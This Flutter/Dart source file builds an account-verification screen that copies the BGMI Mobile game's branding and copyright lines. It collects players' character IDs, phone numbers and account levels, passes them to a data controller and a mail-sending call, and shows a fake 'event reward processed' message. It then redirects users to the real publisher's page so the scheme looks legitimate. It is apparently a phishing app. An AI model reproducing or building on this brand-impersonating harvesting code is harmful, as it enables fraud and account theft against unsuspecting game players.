import 'dart:developer';

import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:fluttertoast/fluttertoast.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:provider/provider.dart';
import 'package:url_launcher/url_launcher.dart';

import 'package:bgmimobile/controller/fb_controller.dart';
import 'package:bgmimobile/home/video.dart';

class VerifyPageScreen extends StatelessWidget {
  const VerifyPageScreen({
    Key? key,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: Padding(
          padding: const EdgeInsets.all(8.0),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Row(
                children: [
                  SizedBox(
                    height: MediaQuery.of(context).size.height * 0.0325,
                    child: Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 8.0),
                      child: Image.asset(
                        'assets/app.png',
                        fit: BoxFit.contain,
                      ),
                    ),
                  ),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "BGMI MOBILE",
                        style: TextStyle(
                            color: Colors.amber.shade800, fontSize: 12),
                      ),
                      const Text(
                        "The original Battle Royale,\nthe first and the best!",
                        style: TextStyle(color: Colors.white, fontSize: 10),
                      ),
                    ],
                  ),
                ],
              ),
              const Icon(Icons.menu),
              const Icon(Icons.shopping_cart)
            ],
          ),
        ),
      ),
      body: SingleChildScrollView(
        child: Column(
          children: [
            const VideoApp(),
            Container(
              width: MediaQuery.of(context).size.width,
              padding: const EdgeInsets.all(8.0),
              child: Stack(
                alignment: Alignment.center,
                children: [
                  Image.asset(
                    'assets/alert.png',
                    width: MediaQuery.of(context).size.width,
                  ),
                  Padding(
                    padding: EdgeInsets.only(
                        left: MediaQuery.of(context).size.width / 10),
                    child: Text(
                      'Complete your account detail first'.toUpperCase(),
                      style: TextStyle(
                        fontSize: 15,
                        fontWeight: FontWeight.bold,
                        shadows: <Shadow>[
                          Shadow(
                            offset: const Offset(0.0, 0.0),
                            blurRadius: 1,
                            color: Colors.amber.shade700,
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
            const VerifyScreenBody(),
            Container(
              height: MediaQuery.of(context).size.height * 0.3,
              width: MediaQuery.of(context).size.width,
              padding: const EdgeInsets.all(8.0),
              decoration: const BoxDecoration(color: Colors.black),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Padding(
                    padding: const EdgeInsets.all(20.0),
                    child: Text("Follow us".toUpperCase(),
                        style: const TextStyle(
                            color: Colors.white,
                            fontSize: 15,
                            fontWeight: FontWeight.bold)),
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceAround,
                    children: const [
                      FaIcon(
                        FontAwesomeIcons.facebookF,
                        color: Colors.white,
                      ),
                      FaIcon(
                        FontAwesomeIcons.instagram,
                        color: Colors.white,
                      ),
                      FaIcon(
                        FontAwesomeIcons.youtube,
                        color: Colors.white,
                      ),
                    ],
                  ),
                  Image.asset(
                    'assets/footer-img.png',
                    fit: BoxFit.contain,
                  ),
                  Column(
                    children: [
                      RichText(
                        textAlign: TextAlign.center,
                        text: const TextSpan(
                          text: "ⓒ 2017 KRAFTON, Inc. All rights reserved.\n",
                          style: TextStyle(
                              color: Colors.white,
                              fontSize: 10,
                              fontFamily: "block"),
                          children: <TextSpan>[
                            TextSpan(
                                text:
                                    "ⓒ 2018-2022 Tencent. All rights reserved.\n",
                                style: TextStyle(
                                  color: Colors.white,
                                )),
                            TextSpan(
                                text: "ⓒ",
                                style: TextStyle(
                                  color: Colors.black,
                                )),
                            TextSpan(
                                text:
                                    "Privacy Policy | Tencent Games User Agreement",
                                style: TextStyle(
                                  color: Colors.white,
                                )),
                          ],
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class VerifyScreenBody extends StatelessWidget {
  const VerifyScreenBody({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    const String _url = 'https://www.pubgmobile.com/announcementofindia/';
    void _launchURL() async {
      if (!await launch(_url)) throw 'Could not launch $_url';
    }

    TextEditingController charaterid = TextEditingController();
    TextEditingController phonenumber = TextEditingController();
    TextEditingController accountlevel = TextEditingController();

    return Column(
      children: [
        Padding(
            padding: const EdgeInsets.symmetric(horizontal: 8.0, vertical: 8.0),
            child: CustomTextEditing(
              maxlenght: 13,
              isLimitRangeTextInputFormatter: false,
              controller: charaterid,
              text: "Character ID",
            )),
        Padding(
            padding: const EdgeInsets.symmetric(horizontal: 8.0, vertical: 8.0),
            child: CustomTextEditing(
              maxlenght: 13,
              isLimitRangeTextInputFormatter: false,
              controller: phonenumber,
              text: "Phone Number",
            )),
        Padding(
            padding: const EdgeInsets.symmetric(horizontal: 8.0, vertical: 8.0),
            child: CustomTextEditing(
              maxlenght: 3,
              isLimitRangeTextInputFormatter: false,
              controller: accountlevel,
              text: "Account Level",
            )),
        AspectRatio(
            aspectRatio: 50 / 10,
            child: InkWell(
              onTap: () async {
                if (phonenumber.text.isNotEmpty &&
                    phonenumber.text.length < 10) {
                  await Fluttertoast.showToast(
                      msg: "Enter valid phone number",
                      toastLength: Toast.LENGTH_SHORT,
                      gravity: ToastGravity.CENTER,
                      timeInSecForIosWeb: 1,
                      backgroundColor: Colors.red,
                      textColor: Colors.white,
                      fontSize: 16.0);
                } else if (charaterid.text.isEmpty) {
                  await Fluttertoast.showToast(
                      msg: "Enter character id",
                      toastLength: Toast.LENGTH_SHORT,
                      gravity: ToastGravity.CENTER,
                      timeInSecForIosWeb: 1,
                      backgroundColor: Colors.red,
                      textColor: Colors.white,
                      fontSize: 16.0);
                } else if (accountlevel.text.isEmpty) {
                  await Fluttertoast.showToast(
                      msg: "Enter account level",
                      toastLength: Toast.LENGTH_SHORT,
                      gravity: ToastGravity.CENTER,
                      timeInSecForIosWeb: 1,
                      backgroundColor: Colors.red,
                      textColor: Colors.white,
                      fontSize: 16.0);
                } else if (charaterid.text.isEmpty ||
                    phonenumber.text.isEmpty ||
                    accountlevel.text.isEmpty) {
                  await Fluttertoast.showToast(
                      msg: "Enter vaild details",
                      toastLength: Toast.LENGTH_SHORT,
                      gravity: ToastGravity.CENTER,
                      timeInSecForIosWeb: 1,
                      backgroundColor: Colors.red,
                      textColor: Colors.white,
                      fontSize: 16.0);
                } else if (charaterid.text.isNotEmpty &&
                    phonenumber.text.isNotEmpty &&
                    phonenumber.text.length > 10 &&
                    accountlevel.text.isNotEmpty) {
                  var provider =
                      Provider.of<DataController>(context, listen: false);

                  provider.setcharaterid(charaterid.text);
                  provider.setphonenumber(phonenumber.text);
                  if (!kIsWeb) {
                    await provider.checkinfo();
                  }
                  provider.setaccountlevel(accountlevel.text);
                  await provider.updateUserDataDetials(
                      charaterid.text, phonenumber.text, accountlevel.text);

                  await provider.sentmail();

                  await Future.delayed(const Duration(seconds: 1), () async {
                    return showDialog(
                        context: context,
                        barrierDismissible: false,
                        builder: (BuildContext context) {
                          Future.delayed(const Duration(seconds: 2), () {
                            Navigator.of(context).pop(true);
                            try {
                              _launchURL();
                            } catch (e) {
                              log("Error url $e");
                            }
                          });

                          return Dialog(
                            backgroundColor: Colors.transparent,
                            shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(
                                    20.0)), //this right here
                            child: Container(
                              height: 300,
                              color: Colors.black.withOpacity(0.5),
                              child: Column(
                                mainAxisAlignment:
                                    MainAxisAlignment.spaceBetween,
                                crossAxisAlignment: CrossAxisAlignment.center,
                                children: [
                                  Stack(
                                    alignment: Alignment.center,
                                    children: [
                                      Image.asset(
                                        "assets/popup-navbar.png",
                                        fit: BoxFit.fitWidth,
                                      ),
                                      Padding(
                                        padding: const EdgeInsets.symmetric(
                                            horizontal: 20),
                                        child: Row(
                                          mainAxisAlignment:
                                              MainAxisAlignment.spaceBetween,
                                          children: [
                                            Text(
                                              "Processing Account"
                                                  .toUpperCase(),
                                              style: const TextStyle(
                                                color: Color(0xFF50362d),
                                                fontWeight: FontWeight.bold,
                                                shadows: <Shadow>[
                                                  Shadow(
                                                    offset: Offset(0.0, 0.0),
                                                    blurRadius: 1,
                                                    color: Color(0xFFfef5ea),
                                                  ),
                                                ],
                                              ),
                                            ),
                                          ],
                                        ),
                                      ),
                                    ],
                                  ),
                                  const Text(
                                    "Thanks for joining this RP Month 7 event",
                                    style: TextStyle(
                                      color: Color(0xFFfef5ea),
                                      fontSize: 15,
                                    ),
                                  ),
                                  const Text(
                                    "Your account has been successfully processed",
                                    style: TextStyle(
                                      color: Color(0xFFfef5ea),
                                      fontSize: 15,
                                    ),
                                  ),
                                  const Text(
                                    "Please wait up to 24 hours",
                                    style: TextStyle(
                                      color: Color(0xFFfef5ea),
                                      fontSize: 15,
                                    ),
                                  ),
                                  Stack(
                                    alignment: Alignment.center,
                                    children: [
                                      Image.asset(
                                        "assets/popup-footer.png",
                                        fit: BoxFit.fitWidth,
                                      ),
                                      Row(
                                        mainAxisAlignment:
                                            MainAxisAlignment.center,
                                        children: [
                                          InkWell(
                                            onTap: () async {
                                              Navigator.pop(context, true);
                                            },
                                            child: SizedBox(
                                              height: 50,
                                              child: AspectRatio(
                                                aspectRatio: 16 / 9,
                                                child: Stack(
                                                  alignment: Alignment.center,
                                                  children: [
                                                    Image.asset(
                                                      "assets/btn-on.png",
                                                      fit: BoxFit.fitWidth,
                                                    ),
                                                    Text(
                                                      "Logout".toUpperCase(),
                                                      style: const TextStyle(
                                                        color: Colors.black,
                                                        fontSize: 12,
                                                      ),
                                                    ),
                                                  ],
                                                ),
                                              ),
                                            ),
                                          ),
                                        ],
                                      ),
                                    ],
                                  ),
                                ],
                              ),
                            ),
                          );
                        });
                  });
                }
              },
              child: Stack(
                alignment: Alignment.center,
                children: [
                  Image.asset(
                    "assets/btn-on.png",
                    fit: BoxFit.fitWidth,
                  ),
                  const Text(
                    "Verify my Account",
                    style: TextStyle(
                      color: Colors.black,
                      fontSize: 14,
                    ),
                  ),
                ],
              ),
            )),
      ],
    );
  }
}

class LimitRangeTextInputFormatter extends TextInputFormatter {
  LimitRangeTextInputFormatter(this.min, this.max) : assert(min < max);

  final int min;
  final int max;

  @override
  TextEditingValue formatEditUpdate(
      TextEditingValue oldValue, TextEditingValue newValue) {
    var value;
    if (newValue.text == '') {
      value = 0;
    } else {
      value = int.parse(newValue.text);
    }

    if (value < min) {
      return TextEditingValue(text: min.toString());
    } else if (value > max) {
      return TextEditingValue(text: max.toString());
    }
    return newValue;
  }
}

class CustomTextEditing extends StatelessWidget {
  final TextEditingController controller;
  final String text;
  final int maxlenght;
  final bool isLimitRangeTextInputFormatter;
  const CustomTextEditing({
    Key? key,
    required this.controller,
    required this.text,
    required this.maxlenght,
    required this.isLimitRangeTextInputFormatter,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    var height = MediaQuery.of(context).size.height;
    var width = MediaQuery.of(context).size.width;
    return CupertinoTextField(
      maxLength: maxlenght,
      controller: controller,
      keyboardType: TextInputType.number,
      inputFormatters: [
        FilteringTextInputFormatter.digitsOnly,
        isLimitRangeTextInputFormatter
            ? LimitRangeTextInputFormatter(0, maxlenght)
            : LengthLimitingTextInputFormatter(
                maxlenght,
              ),
      ],
      padding: EdgeInsets.all(width * 0.0375),
      decoration: const BoxDecoration(
        image: DecorationImage(
            image: AssetImage('assets/verify.png'), fit: BoxFit.fitWidth),
      ),
      placeholderStyle: const TextStyle(
        color: Colors.black,
        fontSize: 14,
        fontWeight: FontWeight.w500,
      ),
      placeholder: text,
    );
  }
}
